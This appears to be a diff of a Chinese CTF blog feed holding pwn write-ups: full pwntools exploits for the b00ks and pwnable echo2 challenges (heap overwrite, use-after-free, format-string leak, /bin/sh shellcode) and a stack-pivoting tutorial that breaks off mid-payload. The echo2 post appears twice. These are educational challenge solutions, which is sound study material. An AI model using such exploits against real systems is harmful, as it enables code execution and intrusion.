+<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">libc = ELF(&quot;/home/kuban/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)</span><br><span class="line">io = process(&#x27;./b00ks&#x27;)</span><br><span class="line"></span><br><span class="line">def debug():	</span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def delete(book_id):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(id))</span><br><span class="line"></span><br><span class="line">def edit(book_id,des):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,des)</span><br><span class="line"></span><br><span class="line">def Print():</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">def change(author):</span><br><span class="line">	io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">	io.sendlineafter(&#x27;: &#x27;,author)</span><br><span class="line"></span><br><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(208,b&#x27;AAAA&#x27;,32,b&#x27;aaaa&#x27;)</span><br><span class="line">create(0x21000,b&#x27;BBBB&#x27;,0x21000,b&#x27;bbbb&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">change(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;Name: &#x27;)</span><br><span class="line">book2_name_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book2 name addr:&quot; + hex(book2_name_addr))</span><br><span class="line">libc_base = book2_name_addr - 0x7d4010</span><br><span class="line">free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line">one_gadget = libc_base + 0x4527a        #0x4527a    0xf03a4    0xf1247</span><br><span class="line">log.success(hex(free_hook))</span><br><span class="line"></span><br><span class="line">edit(1,p64(free_hook))</span><br><span class="line">edit(2,p64(one_gadget))</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>【buuCTF刷题】babyfengshui</title>
     <url>/posts/a500/</url>
     <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>这道题利用布置堆的结构缺陷get shell，非常精妙。一开始我没有理清”指针”和”指针指向的内容”这两个概念，迟迟搞不明白，以后尤其是堆题要特别注意。</p>
@@ -556,41 +669,6 @@
         <tag>heap</tag>
         <tag>babyfengshui</tag>
         <tag>Partial RELRO</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【buuCTF刷题】pwnable-echo2</title>
-    <url>/posts/9ef5/</url>
-    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>第一次做堆——UAF 的题，感觉堆对代码能力的要求更高，并且IDA分析出来的也要辩证的去看，比如函数指针数组，他可能会分析成这样，我们就要知道func[0] &#x3D;echo1;func[1] &#x3D;echo2;func[2] &#x3D;echo3<br><img src="/./images/p5/1.png"><br>注意64位程序格式化字符串漏洞中：<br>    %0$p &lt;=&#x3D;&gt; rdi &lt;=&#x3D;&gt; printf的第一个参数<br>    %1$p &lt;=&#x3D;&gt; rsi &lt;=&#x3D;&gt; printf的第二个参数</p>
-<span id="more"></span>
-
-<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><blockquote>
-<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI3B3bmFibGVfZWNobzI=">https://buuoj.cn/challenges#pwnable_echo2<i class="fa fa-external-link-alt"></i></span></p>
-</blockquote>
-<p>Checksec，64位，保护全关<br><img src="/./images/p5/2.png"><br>IDA分析</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rax</span><br><span class="line">  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF</span><br><span class="line">  __int64 v6[4]; // [rsp+10h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  o = malloc(0x28uLL);</span><br><span class="line">  *(o + 3) = greetings;</span><br><span class="line">  *(o + 4) = byebye;</span><br><span class="line">  printf(&quot;hey, what&#x27;s your name? : &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%24s&quot;, v6);</span><br><span class="line">  v3 = o;</span><br><span class="line">  *o = v6[0];</span><br><span class="line">  v3[1] = v6[1];</span><br><span class="line">  v3[2] = v6[2];</span><br><span class="line">  id = v6[0];</span><br><span class="line">  getchar();</span><br><span class="line">  func[0] = echo1;</span><br><span class="line">  qword_602088 = echo2;</span><br><span class="line">  qword_602090 = echo3;</span><br><span class="line">  for ( i = 0; i != &#x27;y&#x27;; i = getchar() )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;\n- select echo type -&quot;);</span><br><span class="line">        puts(&quot;- 1. : BOF echo&quot;);</span><br><span class="line">        puts(&quot;- 2. : FSB echo&quot;);</span><br><span class="line">        puts(&quot;- 3. : UAF echo&quot;);</span><br><span class="line">        puts(&quot;- 4. : exit&quot;);</span><br><span class="line">        printf(&quot;&gt; &quot;);</span><br><span class="line">        __isoc99_scanf(&quot;%d&quot;, &amp;i);</span><br><span class="line">        getchar();</span><br><span class="line">        if ( i &gt; 3 )</span><br><span class="line">          break;</span><br><span class="line">        (func[i - 1])();</span><br><span class="line">      &#125;</span><br><span class="line">      if ( i == 4 )</span><br><span class="line">        break;</span><br><span class="line">      puts(&quot;invalid menu&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    cleanup();</span><br><span class="line">    printf(&quot;Are you sure you want to exit? (y/n)&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;bye&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>程序分两段看，进入for循环前进行一系列内存空间布局，程序的内存空间是这样的<br><img src="/./images/p5/3.png"><br>__isoc99_scanf(“%24s”, v6);会覆盖到o,o+1和o+2的位置<br>进入for循环，让我们选择三种漏洞利用方式：BOF(echo1) , FSB(echo2)和UAF(echo3)，分别看一下这三个函数</p>
-<ol>
-<li>echo1 废物一个<br><img src="/./images/p5/4.png"></li>
-<li>echo2 是一个简单的格式化字符串漏洞，format在栈上，可以泄露rbp地址<br><img src="/./images/p5/5.png"></li>
-<li>echo3 给变量s分配一个0x20的大小，然后输出我们输入的内容，最后free掉s的chunk，注意free之后没有将指针置零，所以可能存在UAF漏洞<br><img src="/./images/p5/6.png"><br>继续往下看，注意这里<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  if ( i == 4 )</span><br><span class="line">    break;</span><br><span class="line">  puts(&quot;invalid menu&quot;);</span><br><span class="line">&#125;</span><br><span class="line">cleanup();</span><br><span class="line">printf(&quot;Are you sure you want to exit? (y/n)&quot;);</span><br></pre></td></tr></table></figure>
-当我们选择”- 4. : exit”时，他会询问我们一次”Are you sure you want to exit? (y&#x2F;n)”，我们再输入”y”时，程序才会真的退出，如果输入”n”，程序还是回到循环中继续选择。<strong>但是无论怎么样，都执行了cleanup()函数，而cleanup()是将最开始的那个o指针free掉了。</strong><br><img src="/./images/p5/7.png"><br>如果我们只是骗一下程序假装要退出，让他执行cleanup，然后输入n，会发生什么呢，首先free掉的chunk会被fastbins链起来<br><img src="/./images/p5/8.png"><br>输入n，再次进入循环，该选择哪个漏洞函数呢？当然是echo3<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 echo3()</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  (*(o + 3))(o);</span><br><span class="line">  s = malloc(0x20uLL);</span><br><span class="line">  get_input(s, 0x20);</span><br><span class="line">  puts(s);</span><br><span class="line">  free(s);</span><br><span class="line">  (*(o + 4))(o);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-因为echo3 malloc的大小是0x20，我们fastbins中的chunk大小是0x28，所以echo3中的s分配到的内存就是o的chunk<br><img src="/./images/p5/9.png"><br>我们最多向这个chunk写入0x20的字节，也就是o,o+1,o+2,o+3。在被free掉之后，我们写入的内容依然存在，在fastbins中的地址也没有发生变化<br><strong>这就够了，将o+3——也就是greetings()覆盖为shellcode的地址，再次进入echo3时，就会执行shellcode</strong><br>那么shellcode从哪来呢？<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;hey, what&#x27;s your name? : &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%24s&quot;, v6);</span><br></pre></td></tr></table></figure>
-忘掉他了吗？我们往栈上的v6（写入小于24字节的shellcode，然后用echo2中的格式化字符串漏洞泄露rbp地址，然后rbp-0x20就可以啦，参数偏移量10（因为是64位程序，要算上6个寄存器）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,b&#x27;2&#x27;)</span><br><span class="line">io.sendline(b&#x27;%10$pAAAA&#x27;)</span><br><span class="line">rbp = int(io.recvuntil(&#x27;AAAA&#x27;,drop=True),16)</span><br><span class="line">shellcode_addr = rbp - 0x20</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">x64_32 = 1</span><br><span class="line">if x64_32:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;amd64&#x27;)</span><br><span class="line">else:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :io.send(data)</span><br><span class="line">sa      = lambda delim,data         :io.sendafter(str(delim), data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(str(delim), data)</span><br><span class="line">r       = lambda num                :io.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">itr     = lambda                    :io.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">l64     = lambda      :u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">l32     = lambda      :u32(io.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">######################################################################################################</span><br><span class="line">#io = process(&#x27;./echo2&#x27;)</span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,27765)</span><br><span class="line"></span><br><span class="line">shellcode = b&#x27;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&#x27;</span><br><span class="line">sla(&#x27;name? : &#x27;,shellcode)</span><br><span class="line"></span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">sl(&#x27;%10$pAAAA&#x27;)</span><br><span class="line">ru(b&#x27;0x&#x27;)</span><br><span class="line">rbp_addr = int(ru(b&#x27;AAAA&#x27;),16)</span><br><span class="line">shellcode_addr = rbp_addr - 0x20</span><br><span class="line">leak(&#x27;shellcode_addr-----&gt;&#x27;, shellcode_addr)</span><br><span class="line"></span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">sla(&#x27;(y/n)&#x27;,&#x27;n&#x27;)</span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">sla(&#x27;\n&#x27;,b&#x27;a&#x27;*24 + p64(shellcode_addr))</span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>buuCTF刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
-        <tag>fmt</tag>
-        <tag>UAF</tag>
-        <tag>pwnable_echo2</tag>
       </tags>
   </entry>
   <entry>
@@ -731,6 +809,104 @@
       </tags>
   </entry>
   <entry>
+    <title>【buuCTF刷题】pwnable-echo2</title>
+    <url>/posts/9ef5/</url>
+    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>第一次做堆——UAF 的题，感觉堆对代码能力的要求更高，并且IDA分析出来的也要辩证的去看，比如函数指针数组，他可能会分析成这样，我们就要知道func[0] &#x3D;echo1;func[1] &#x3D;echo2;func[2] &#x3D;echo3<br><img src="/./images/p5/1.png"><br>注意64位程序格式化字符串漏洞中：<br>    %0$p &lt;=&#x3D;&gt; rdi &lt;=&#x3D;&gt; printf的第一个参数<br>    %1$p &lt;=&#x3D;&gt; rsi &lt;=&#x3D;&gt; printf的第二个参数</p>
+<span id="more"></span>
+
+<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><blockquote>
+<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI3B3bmFibGVfZWNobzI=">https://buuoj.cn/challenges#pwnable_echo2<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p>Checksec，64位，保护全关<br><img src="/./images/p5/2.png"><br>IDA分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rax</span><br><span class="line">  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF</span><br><span class="line">  __int64 v6[4]; // [rsp+10h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  o = malloc(0x28uLL);</span><br><span class="line">  *(o + 3) = greetings;</span><br><span class="line">  *(o + 4) = byebye;</span><br><span class="line">  printf(&quot;hey, what&#x27;s your name? : &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%24s&quot;, v6);</span><br><span class="line">  v3 = o;</span><br><span class="line">  *o = v6[0];</span><br><span class="line">  v3[1] = v6[1];</span><br><span class="line">  v3[2] = v6[2];</span><br><span class="line">  id = v6[0];</span><br><span class="line">  getchar();</span><br><span class="line">  func[0] = echo1;</span><br><span class="line">  qword_602088 = echo2;</span><br><span class="line">  qword_602090 = echo3;</span><br><span class="line">  for ( i = 0; i != &#x27;y&#x27;; i = getchar() )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;\n- select echo type -&quot;);</span><br><span class="line">        puts(&quot;- 1. : BOF echo&quot;);</span><br><span class="line">        puts(&quot;- 2. : FSB echo&quot;);</span><br><span class="line">        puts(&quot;- 3. : UAF echo&quot;);</span><br><span class="line">        puts(&quot;- 4. : exit&quot;);</span><br><span class="line">        printf(&quot;&gt; &quot;);</span><br><span class="line">        __isoc99_scanf(&quot;%d&quot;, &amp;i);</span><br><span class="line">        getchar();</span><br><span class="line">        if ( i &gt; 3 )</span><br><span class="line">          break;</span><br><span class="line">        (func[i - 1])();</span><br><span class="line">      &#125;</span><br><span class="line">      if ( i == 4 )</span><br><span class="line">        break;</span><br><span class="line">      puts(&quot;invalid menu&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    cleanup();</span><br><span class="line">    printf(&quot;Are you sure you want to exit? (y/n)&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;bye&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序分两段看，进入for循环前进行一系列内存空间布局，程序的内存空间是这样的<br><img src="/./images/p5/3.png"><br>__isoc99_scanf(“%24s”, v6);会覆盖到o,o+1和o+2的位置<br>进入for循环，让我们选择三种漏洞利用方式：BOF(echo1) , FSB(echo2)和UAF(echo3)，分别看一下这三个函数</p>
+<ol>
+<li>echo1 废物一个<br><img src="/./images/p5/4.png"></li>
+<li>echo2 是一个简单的格式化字符串漏洞，format在栈上，可以泄露rbp地址<br><img src="/./images/p5/5.png"></li>
+<li>echo3 给变量s分配一个0x20的大小，然后输出我们输入的内容，最后free掉s的chunk，注意free之后没有将指针置零，所以可能存在UAF漏洞<br><img src="/./images/p5/6.png"><br>继续往下看，注意这里<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  if ( i == 4 )</span><br><span class="line">    break;</span><br><span class="line">  puts(&quot;invalid menu&quot;);</span><br><span class="line">&#125;</span><br><span class="line">cleanup();</span><br><span class="line">printf(&quot;Are you sure you want to exit? (y/n)&quot;);</span><br></pre></td></tr></table></figure>
+当我们选择”- 4. : exit”时，他会询问我们一次”Are you sure you want to exit? (y&#x2F;n)”，我们再输入”y”时，程序才会真的退出，如果输入”n”，程序还是回到循环中继续选择。<strong>但是无论怎么样，都执行了cleanup()函数，而cleanup()是将最开始的那个o指针free掉了。</strong><br><img src="/./images/p5/7.png"><br>如果我们只是骗一下程序假装要退出，让他执行cleanup，然后输入n，会发生什么呢，首先free掉的chunk会被fastbins链起来<br><img src="/./images/p5/8.png"><br>输入n，再次进入循环，该选择哪个漏洞函数呢？当然是echo3<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 echo3()</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  (*(o + 3))(o);</span><br><span class="line">  s = malloc(0x20uLL);</span><br><span class="line">  get_input(s, 0x20);</span><br><span class="line">  puts(s);</span><br><span class="line">  free(s);</span><br><span class="line">  (*(o + 4))(o);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+因为echo3 malloc的大小是0x20，我们fastbins中的chunk大小是0x28，所以echo3中的s分配到的内存就是o的chunk<br><img src="/./images/p5/9.png"><br>我们最多向这个chunk写入0x20的字节，也就是o,o+1,o+2,o+3。在被free掉之后，我们写入的内容依然存在，在fastbins中的地址也没有发生变化<br><strong>这就够了，将o+3——也就是greetings()覆盖为shellcode的地址，再次进入echo3时，就会执行shellcode</strong><br>那么shellcode从哪来呢？<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;hey, what&#x27;s your name? : &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%24s&quot;, v6);</span><br></pre></td></tr></table></figure>
+忘掉他了吗？我们往栈上的v6（写入小于24字节的shellcode，然后用echo2中的格式化字符串漏洞泄露rbp地址，然后rbp-0x20就可以啦，参数偏移量10（因为是64位程序，要算上6个寄存器）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,b&#x27;2&#x27;)</span><br><span class="line">io.sendline(b&#x27;%10$pAAAA&#x27;)</span><br><span class="line">rbp = int(io.recvuntil(&#x27;AAAA&#x27;,drop=True),16)</span><br><span class="line">shellcode_addr = rbp - 0x20</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">x64_32 = 1</span><br><span class="line">if x64_32:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;amd64&#x27;)</span><br><span class="line">else:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :io.send(data)</span><br><span class="line">sa      = lambda delim,data         :io.sendafter(str(delim), data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(str(delim), data)</span><br><span class="line">r       = lambda num                :io.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">itr     = lambda                    :io.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">l64     = lambda      :u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">l32     = lambda      :u32(io.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">######################################################################################################</span><br><span class="line">#io = process(&#x27;./echo2&#x27;)</span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,27765)</span><br><span class="line"></span><br><span class="line">shellcode = b&#x27;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&#x27;</span><br><span class="line">sla(&#x27;name? : &#x27;,shellcode)</span><br><span class="line"></span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">sl(&#x27;%10$pAAAA&#x27;)</span><br><span class="line">ru(b&#x27;0x&#x27;)</span><br><span class="line">rbp_addr = int(ru(b&#x27;AAAA&#x27;),16)</span><br><span class="line">shellcode_addr = rbp_addr - 0x20</span><br><span class="line">leak(&#x27;shellcode_addr-----&gt;&#x27;, shellcode_addr)</span><br><span class="line"></span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">sla(&#x27;(y/n)&#x27;,&#x27;n&#x27;)</span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">sla(&#x27;\n&#x27;,b&#x27;a&#x27;*24 + p64(shellcode_addr))</span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>buuCTF刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
+        <tag>fmt</tag>
+        <tag>UAF</tag>
+        <tag>pwnable_echo2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈迁移学习总结</title>
+    <url>/posts/6e43/</url>
+    <content><![CDATA[<h1 id="前置知识：什么是栈迁移？"><a href="#前置知识：什么是栈迁移？" class="headerlink" title="前置知识：什么是栈迁移？"></a>前置知识：什么是栈迁移？</h1><blockquote>
+<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9mYW5jeS1yb3AvI3N0YWNrLXBpdm90aW5n">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p>首先看一下正常的程序结构，函数在结束时会进行leave和ret指令<br>——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移到上一个函数的记录的位置上去<br>——ret就做一件事pop eip，也就是将esp中的内容弹入eip中，也就是内容放到程序的执行流上。</p>
+<span id="more"></span>
+
+<p><img src="/images/p1/s1.png"><br>在栈迁移中，很多情况下我们需要在栈上的返回地址覆盖为leave_ret的gadget上（这里的0xcffc），让程序执行两次leave_ret，那连续的两个leave_ret后栈会发生什么变化呢？<br>回到初始状态，假设我们的栈可以溢出到返回地址，我们将ebp覆盖为esp的地址（0xcfd0），返回地址覆盖为一个leave_ret的gadget，观察下面的图<br><img src="/images/p1/s2.png"><br>可以看到，栈在经历过两次leave_ret后，程序的执行流又回到了我们的栈空间，那如果我们在写入数据的时候，从0xcfd4的位置开始写入我们的system函数的地址，那就可以把system函数放到程序的执行流，从而执行我们的system(‘&#x2F;bin&#x2F;sh’)<br>通过两道例题实践栈迁移</p>
+<hr>
+<h1 id="例1：ciscn-2019-es-2"><a href="#例1：ciscn-2019-es-2" class="headerlink" title="例1：ciscn_2019_es_2"></a>例1：ciscn_2019_es_2</h1><blockquote>
+<p><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2Npc2NuXzIwMTlfZXNfMg==">https://buuoj.cn/challenges#ciscn_2019_es_2<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p>checksec;file：32位，开启NX保护<br><img src="/images/p1/s3.png"></p>
+<p>IDA里面分析，栈溢出发生在vul函数，但是只可以溢出0x8的字节，这只能够覆盖ebp_main和返回地址，而想再向栈上像ret2text那样写入system和binsh显然不可行<br><img src="/images/p1/s4.png"></p>
+<p>这个时候就要考虑栈迁移了<br>程序存在system函数，但没有binsh字符串，我们需要向某个地址写入binsh<br><img src="/images/p1/s5.png"></p>
+<p>那向哪个位置写入我们的binsh呢？其实就可以写到这个栈中，只要拿到了ebp的地址，就可以通过偏移拿到栈上任意内容的地址。<br>那ebp的地址怎么拿到呢？我们知道read函数结束时会自动加‘\x00’作为字符串的截断，然后输出时遇到’\x00’停止输出，如果我们在第一次read的时候给他填满0x30个字符，那么read就没地方给他补上’\x00’了，那么输出的时候打印完0x30个字符，就会继续打印出ebp的地址了。<br>第一次read拿到ebp的地址后，第二次read就要控制程序的执行流了<br>根据前置知识布置一下栈结构<br><img src="/images/p1/s6.png"></p>
+<p>gdb调试看一下read后的栈结构，偏移为0x28(&#x3D;0xf8-0xd0)，同时这个0x28也是我们写入的字符串距离ebp的位置<br><img src="/images/p1/s7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp_addr = ebp_addr - 0x38    #这是我们迁移的位置(迁移到栈顶)</span><br><span class="line">binsh_addr = ebp_addr - 0x28    #这是我们写入的binsh距离ebp的位置</span><br></pre></td></tr></table></figure>
+
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,26904)</span><br><span class="line">elf = ELF(&#x27;./ciscn_2019_es_2&#x27;)</span><br><span class="line"></span><br><span class="line">system_addr = elf.plt[&#x27;system&#x27;]</span><br><span class="line">leave_ret = 0x08048562          #0x08048562 : leave ; ret</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;a&#x27;*36 + b&#x27;bbbb&#x27;</span><br><span class="line">io.sendafter(&#x27;name?\n&#x27;,payload1)</span><br><span class="line">io.recvuntil(b&#x27;bbbb&#x27;)</span><br><span class="line">ebp_addr = u32(io.recv(4))</span><br><span class="line">success(hex(ebp_addr))</span><br><span class="line">esp_addr = ebp_addr - 0x38</span><br><span class="line">binsh_addr = ebp_addr - 0x28</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;aaaa&#x27;+ p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + 